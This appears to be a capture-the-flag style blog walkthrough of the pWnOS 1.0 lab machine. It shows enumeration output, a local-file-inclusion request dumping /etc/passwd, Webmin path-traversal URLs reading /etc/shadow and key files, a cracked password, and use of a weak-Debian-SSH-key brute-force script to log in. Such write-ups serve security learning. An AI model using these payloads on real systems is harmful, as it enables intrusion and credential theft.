@@ -1,0 +1,192 @@
+---
+layout: post
+title: "pWnOS: 1.0"
+date: 2015-05-10 12:13:34 +0200
+comments: true
+categories: [vulnhub, pwnos]
+---
+Image: [pWnOS: 1.0](https://www.vulnhub.com/entry/pwnos-10,33/)
+
+Nmap output:
+{% codeblock %}
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
+80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
+139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
+445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
+10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+{% endcodeblock %}
+
+After a while of browsing the web page, we found trivial LFI vulnerability:
+{% codeblock %}
+http://193.168.0.25/index1.php?help=true&connect=../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+dhcp:x:100:101::/nonexistent:/bin/false
+syslog:x:101:102::/home/syslog:/bin/false
+klog:x:102:103::/home/klog:/bin/false
+mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
+obama:x:1001:1001::/home/obama:/bin/bash
+osama:x:1002:1002::/home/osama:/bin/bash
+yomama:x:1003:1003::/home/yomama:/bin/bash
+{% endcodeblock %}
+
+We can find a lot of information querying the samba service too:
+{% codeblock %}
+root@kali:~/vulnhub/pwnos# nmblookup -A 192.168.0.25
+Looking up status of 192.168.0.25
+        UBUNTUVM        <00> -         H <ACTIVE>
+        UBUNTUVM        <03> -         H <ACTIVE>
+        UBUNTUVM        <20> -         H <ACTIVE>
+        ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>
+        MSHOME          <1d> -         H <ACTIVE>
+        MSHOME          <1e> - <GROUP> H <ACTIVE>
+        MSHOME          <00> - <GROUP> H <ACTIVE>
+
+        MAC Address = 00-00-00-00-00-00
+
+root@kali:~/vulnhub/pwnos# smbclient -L\\UBUNTUVM -I 192.168.0.25 -N
+Anonymous login successful
+Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        home            Disk      Home Directory for vmware User
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service (ubuntuvm)
+Anonymous login successful
+Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
+
+        Server               Comment
+        ---------            -------
+        UBUNTUVM             ubuntuvm
+
+        Workgroup            Master
+        ---------            -------
+        MSHOME               UBUNTUVM
+{% endcodeblock %}
+
+There are a few enumeration modules in metasploit:
+{% codeblock %}
+msf exploit(usermap_script) > use auxiliary/scanner/smb/pipe_auditor
+msf auxiliary(pipe_auditor) > setg RHOSTS 192.168.0.25
+RHOSTS => 192.168.0.25
+msf auxiliary(pipe_auditor) > exploit
+
+[*] 192.168.0.25 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \lsass, \ntsvcs, \srvsvc, \wkssvc
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf auxiliary(smb_enumshares) > use auxiliary/scanner/smb/smb_enumusers
+msf auxiliary(smb_enumusers) > exploit
+
+[*] 192.168.0.25 UBUNTUVM [ games, nobody, proxy, syslog, www-data, root, news, bin, mail, dhcp, daemon, sshd, man, lp, mysql, gnats, backup, sys, klog, vmware, list, irc, sync, uucp ] ( LockoutTries=0 PasswordMin=5 )
+
+msf auxiliary(smb_login) > use auxiliary/scanner/smb/smb_lookupsid
+msf auxiliary(smb_lookupsid) > exploit
+
+[*] 192.168.0.25 PIPE(LSARPC) LOCAL(UBUNTUVM - 5-21-2952145021-507220021-499326276) DOMAIN(MSHOME - )
+[*] 192.168.0.25 USER=nobody RID=501
+[*] 192.168.0.25 GROUP=None RID=513
+[*] 192.168.0.25 USER=root RID=1000
+[*] 192.168.0.25 USER=daemon RID=1002
+[*] 192.168.0.25 USER=bin RID=1004
+[*] 192.168.0.25 USER=sys RID=1006
+[*] 192.168.0.25 USER=sync RID=1008
+[*] 192.168.0.25 USER=games RID=1010
+[*] 192.168.0.25 USER=man RID=1012
+[*] 192.168.0.25 USER=lp RID=1014
+[*] 192.168.0.25 USER=mail RID=1016
+[*] 192.168.0.25 USER=news RID=1018
+[*] 192.168.0.25 USER=uucp RID=1020
+[*] 192.168.0.25 USER=proxy RID=1026
+[*] 192.168.0.25 USER=www-data RID=1066
+[*] 192.168.0.25 USER=backup RID=1068
+[*] 192.168.0.25 USER=list RID=1076
+[*] 192.168.0.25 USER=irc RID=1078
+[*] 192.168.0.25 USER=gnats RID=1082
+[*] 192.168.0.25 USER=dhcp RID=1200
+[*] 192.168.0.25 USER=syslog RID=1202
+[*] 192.168.0.25 USER=klog RID=1204
+[*] 192.168.0.25 USER=mysql RID=1206
+[*] 192.168.0.25 USER=sshd RID=1208
+[*] 192.168.0.25 USER=vmware RID=3000
+[*] 192.168.0.25 UBUNTUVM [nobody, root, daemon, bin, sys, sync, games, man, lp, mail, news, uucp, proxy, www-data, backup, list, irc, gnats, dhcp, syslog, klog, mysql, sshd, vmware ]
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+{% endcodeblock %}
+
+The webmin is vulnerable and the exploit in metasploit:
+{% codeblock %}
+       Name: Webmin File Disclosure
+     Module: auxiliary/admin/webmin/file_disclosure
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+  Disclosed: 2006-06-30
+{% endcodeblock %}
+
+Basically the exploitation could be performed on command line to disclose arbitrary file, for example:
+{% codeblock %}
+http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow
+
+http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.conf
+
+http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.users
+
+http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.pem
+{% endcodeblock %}
+
+Using john on /etc/shadow, we obtain credentials of user vmware for successful login to the system:
+{% codeblock %}
+h4ckm3           (vmware)
+{% endcodeblock %}
+
+The box could be rooted using standard vmsplice exploit.
+
+However, there is another way to get user account. The script
+[dowkd.pl](https://wiki.debian.org/SSLkeys#Testing_keys_using_dowkd.pl) ensures
+us that the OpenSSL is vulnerable
+([CVE-2008-0166](https://security-tracker.debian.org/tracker/CVE-2008-0166)). 
+
+We download and unpack already generated RSA keys from offensive-security repository:
+{% codeblock %}
+$ wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/debian_ssh_rsa_2048_x86.tar.bz2
+{% endcodeblock %}
+
+Because usage of weak private keys could be blacklisted on our server, we use
+the following
+[instructions](https://unix.stackexchange.com/questions/109908/public-key-f36e8704ea2db360ff42ad26671794d5-blacklisted-see-ssh)
+to enable them. 
+
+Basically adding this directive to our ssh_config file should be sufficient:
+{% codeblock %}
+UseBlacklistedKeys yes 
+{% endcodeblock %} 
+
+In exploit-db, we use python script to try every possible private key:
+{% codeblock %}
+$ python platforms/linux/remote/5720.py /tmp/rsa/2048 192.168.0.25 obama
+
+Key Found in file: dcbe2a56e8cdea6d17495f6648329ee2-4679
+Execute: ssh -lobama -p22 -i /tmp/rsa/2048/dcbe2a56e8cdea6d17495f6648329ee2-4679 192.168.0.25
+{% endcodeblock %}
